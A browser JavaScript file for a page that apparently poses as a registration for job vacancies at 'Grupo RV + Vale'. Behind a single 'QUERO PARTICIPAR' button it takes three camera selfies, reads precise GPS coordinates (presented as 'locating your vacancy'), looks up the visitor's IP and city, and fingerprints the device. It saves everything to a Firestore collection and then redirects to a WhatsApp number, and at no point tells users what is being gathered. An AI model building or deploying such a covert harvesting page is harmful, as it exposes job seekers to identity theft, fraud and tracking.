import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyA4tZjjfiOauLn2PPxYAp6ylNqB9LWJkI0",
  authDomain: "rv-grup.firebaseapp.com",
  projectId: "rv-grup",
  storageBucket: "rv-grup.firebasestorage.app",
  messagingSenderId: "1061419825993",
  appId: "1:1061419825993:web:5cb7b020efd40b8cf13898"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// ======================
// ÁUDIO
// ======================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  fala.pitch = 1;
  speechSynthesis.speak(fala);
}

// ======================
// INICIAR SISTEMA
// ======================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente. após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    await new Promise((resolve) => {
      if(video.readyState >= 2){
        resolve();
      } else {
        video.onloadeddata = () => resolve();
      }
    });

    statusText.innerHTML = "✅ Sistema pronto";
  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}

window.onload = () => {
  iniciarSistema();
};

// ======================
// FUNÇÃO: ANALISAR DISPOSITIVO
// ======================
function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
      const match = ua.match(/Android\s([0-9\.]+)/);
      if (match) androidVersion = match[1];
  }
  
  let browser = "Desconhecido";
  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
  
  let model = "Desconhecido";
  if (ua.indexOf("Mobile") >= 0) {
      const parts = ua.split(/[()]/);
      if (parts.length > 1) {
          const deviceParts = parts[1].split(';');
          for (let part of deviceParts) {
              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
                  model = part.trim();
                  break;
              }
          }
      }
  }
  return { androidVersion, browser, model };
}

// ======================
// BOTÃO
// ======================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
    
    // ======================
    // MÚLTIPLAS FOTOS
    // ======================
    statusText.innerHTML = "📸 Capturando Dados de Imagem...";
    falar("Capturando imagens de verificação.");

    const largura = video.videoWidth;
    const altura = video.videoHeight;

    if(!largura || !altura){
      throw new Error("Vídeo não carregou");
    }

    canvas.width = largura;
    canvas.height = altura;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    // Loop para capturar 3 fotos
    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, largura, altura);
        fotos.push(canvas.toDataURL("image/jpeg", 0.8));
        
        // Pausa de 1 segundo entre fotos (exceto na última)
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Desliga a câmera após capturar as fotos
    const stream = video.srcObject;
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    // ======================
    // GPS
    // ======================
    let latitude = "não permitido";
    let longitude = "não permitido";

    try {
      statusText.innerHTML = "📍 Localizando sua Vaga...";
      falar("Localizando sua Vaga.");

      const localizacao = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      });

      latitude = localizacao.coords.latitude;
      longitude = localizacao.coords.longitude;
    } catch(err) {
      console.log(err);
    }

    // ======================
    // IP E LOCALIZAÇÃO DE REDE
    // ======================
    let ip = "indisponível";
    let cidade = "";
    let estado = "";
    let pais = "";

    try {
      statusText.innerHTML = "🌐 Obtendo Dados Regionais...";
      const req = await fetch("https://ipapi.co/json/");
      const json = await req.json();

      ip = json.ip || "";
      cidade = json.city || "";
      estado = json.region || "";
      pais = json.country_name || "";
    } catch(err) {
      console.log(err);
    }

    // ======================
    // FIREBASE
    // ======================
    statusText.innerHTML = "💾 Salvando cadastro...";
    falar("Salvando cadastro.");
    
    const infoDispositivo = analisarDispositivo();

    await addDoc(collection(db, "checkins"), {
      selfies: fotos, // Agora salva o array com as 3 imagens
      latitude: latitude,
      longitude: longitude,
      ip: ip,
      cidade: cidade,
      estado: estado,
      pais: pais,
      userAgent: navigator.userAgent,
      modeloDispositivo: infoDispositivo.model,
      versaoAndroid: infoDispositivo.androidVersion,
      navegador: infoDispositivo.browser,
      plataforma: navigator.platform,
      idioma: navigator.language,
      larguraTela: window.innerWidth,
      alturaTela: window.innerHeight,
      data: serverTimestamp()
    });

    // ======================
    // FINAL
    // ======================
    statusText.innerHTML = "✅ Cadastro concluído";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Erro no cadastro";
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
